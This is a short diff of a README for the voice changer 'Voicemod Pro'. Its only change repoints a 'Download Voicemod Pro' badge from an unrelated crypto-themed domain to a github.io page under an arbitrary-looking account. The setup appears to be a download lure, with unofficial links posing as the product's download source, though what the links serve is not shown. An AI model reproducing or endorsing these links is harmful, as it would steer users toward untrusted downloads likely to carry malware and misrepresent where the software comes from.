@@ -2,7 +2,7 @@
 
 Voicemod Pro brings real-time voice changing, AI voices, and a soundboard for streams, calls, and games.
 
-[![Download Voicemod Pro](https://img.shields.io/badge/Download-Voicemod_Pro-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download Voicemod Pro](https://img.shields.io/badge/Download-Voicemod_Pro-blueviolet)](https://ann324201.github.io/.github/Voicemod-Pro)
 
 ---
 
